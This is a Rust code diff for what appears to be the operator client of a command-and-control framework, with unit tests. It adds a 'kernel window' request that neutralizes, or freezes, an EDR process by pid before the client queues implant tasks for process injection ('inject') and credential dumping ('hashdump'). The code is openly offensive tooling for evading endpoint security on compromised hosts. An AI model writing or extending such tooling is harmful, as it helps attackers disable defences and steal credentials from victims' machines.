@@ -381,3 +381,177 @@ pub async fn fetch_profile(
     }
     Ok(resp.json().await?)
 }
+
+// ===== Kernel time-window (T2, operator-initiated) =====
+
+/// HTTP reply from `POST /api/kernel/window`. Non-2xx is not an Err: Settings
+/// must show the JSON (including close `restored: false`), and auto-open must
+/// not fail-closed the beacon task.
+#[derive(Debug, Clone)]
+pub struct KernelWindowReply {
+    pub status: u16,
+    pub body: serde_json::Value,
+}
+
+/// `POST /api/kernel/window`.
+pub fn kernel_window_url(server: &str) -> String {
+    format!("{}/api/kernel/window", server.trim_end_matches('/'))
+}
+
+/// Body `{phase, pid?}`. `pid` 0 / None is omitted; neutralize-on-open still
+/// requires pid > 0 server-side.
+pub fn kernel_window_body(phase: &str, pid: Option<u32>) -> serde_json::Value {
+    match pid.filter(|p| *p > 0) {
+        Some(pid) => serde_json::json!({ "phase": phase, "pid": pid }),
+        None => serde_json::json!({ "phase": phase }),
+    }
+}
+
+/// Inject / hashdump are the tasks sequenced inside an open T2 window.
+pub fn command_wants_kernel_open(command: &serde_json::Value) -> bool {
+    matches!(
+        command.get("type").and_then(|v| v.as_str()),
+        Some("inject") | Some("hashdump")
+    )
+}
+
+/// 2xx (including close `ok: false, restored: false`) and 404 (daemon routes
+/// unregistered) are silent. 502 `failed_step` and other errors become a
+/// notice; the caller still enqueues the implant task.
+pub fn kernel_open_notice(status: u16, body: &serde_json::Value) -> Option<String> {
+    if (200..300).contains(&status) || status == 404 {
+        return None;
+    }
+    let err = body
+        .get("err")
+        .and_then(|v| v.as_str())
+        .filter(|s| !s.is_empty())
+        .unwrap_or("see body");
+    let mut msg = format!("kernel window open failed (HTTP {status}");
+    if let Some(step) = body.get("failed_step").and_then(|v| v.as_str()) {
+        msg.push_str(", failed_step=");
+        msg.push_str(step);
+    }
+    msg.push_str("): ");
+    msg.push_str(err);
+    msg.push_str(" — task still queued");
+    Some(msg)
+}
+
+fn parse_kernel_window_response(status: u16, text: &str) -> serde_json::Value {
+    if text.is_empty() {
+        return serde_json::json!({ "ok": false, "err": format!("HTTP {status}") });
+    }
+    serde_json::from_str(text).unwrap_or_else(|_| serde_json::json!({ "ok": false, "err": text }))
+}
+
+/// `POST /api/kernel/window` — returns status+body even on 404/502.
+pub async fn kernel_window(
+    client: &Client,
+    server: &str,
+    bearer: &str,
+    phase: &str,
+    pid: Option<u32>,
+) -> Result<KernelWindowReply> {
+    let url = kernel_window_url(server);
+    let body = kernel_window_body(phase, pid);
+    let resp = authed(client.post(&url).json(&body), &Some(bearer.to_string()))
+        .send()
+        .await?;
+    let status = resp.status().as_u16();
+    let text = resp.text().await.unwrap_or_default();
+    Ok(KernelWindowReply {
+        status,
+        body: parse_kernel_window_response(status, &text),
+    })
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn kernel_window_url_strips_trailing_slash() {
+        assert_eq!(
+            kernel_window_url("http://127.0.0.1:8443/"),
+            "http://127.0.0.1:8443/api/kernel/window"
+        );
+        assert_eq!(
+            kernel_window_url("http://127.0.0.1:8443"),
+            "http://127.0.0.1:8443/api/kernel/window"
+        );
+    }
+
+    #[test]
+    fn kernel_window_body_omits_pid_when_unset() {
+        let v = kernel_window_body("open", None);
+        assert_eq!(v, serde_json::json!({ "phase": "open" }));
+        assert!(v.get("pid").is_none());
+        let v0 = kernel_window_body("close", Some(0));
+        assert_eq!(v0, serde_json::json!({ "phase": "close" }));
+    }
+
+    #[test]
+    fn kernel_window_body_includes_pid() {
+        assert_eq!(
+            kernel_window_body("open", Some(1234)),
+            serde_json::json!({ "phase": "open", "pid": 1234 })
+        );
+    }
+
+    #[test]
+    fn command_wants_kernel_open_only_inject_and_hashdump() {
+        assert!(command_wants_kernel_open(
+            &serde_json::json!({ "type": "inject" })
+        ));
+        assert!(command_wants_kernel_open(
+            &serde_json::json!({ "type": "hashdump", "method": 0 })
+        ));
+        assert!(!command_wants_kernel_open(
+            &serde_json::json!({ "type": "ping" })
+        ));
+        assert!(!command_wants_kernel_open(
+            &serde_json::json!({ "type": "shell" })
+        ));
+        // Inject target pid is not a kernel-window EDR pid; type alone gates.
+        assert!(command_wants_kernel_open(
+            &serde_json::json!({ "type": "inject", "pid": 99 })
+        ));
+    }
+
+    #[test]
+    fn kernel_open_notice_silent_on_2xx_and_404() {
+        assert!(kernel_open_notice(200, &serde_json::json!({ "ok": true })).is_none());
+        // Close honesty (`restored: false`) is success-shaped HTTP 200.
+        let close = serde_json::json!({
+            "ok": false,
+            "phase": "close",
+            "steps": [{ "restored": false, "reason": "no undo op" }]
+        });
+        assert!(kernel_open_notice(200, &close).is_none());
+        assert!(kernel_open_notice(404, &serde_json::json!({ "ok": false })).is_none());
+    }
+
+    #[test]
+    fn kernel_open_notice_surfaces_502_failed_step() {
+        let body = serde_json::json!({
+            "ok": false,
+            "failed_step": "neutralize",
+            "err": "neutralize requires pid > 0 (EDR process for freeze)"
+        });
+        let msg = kernel_open_notice(502, &body).expect("502 is a notice");
+        assert!(msg.contains("502"));
+        assert!(msg.contains("failed_step=neutralize"));
+        assert!(msg.contains("task still queued"));
+    }
+
+    #[test]
+    fn parse_kernel_window_response_json_or_text() {
+        let j = parse_kernel_window_response(200, r#"{"ok":true,"phase":"open"}"#);
+        assert_eq!(j["ok"], true);
+        let empty = parse_kernel_window_response(404, "");
+        assert_eq!(empty["err"], "HTTP 404");
+        let plain = parse_kernel_window_response(403, "admin required");
+        assert_eq!(plain["err"], "admin required");
+    }
+}
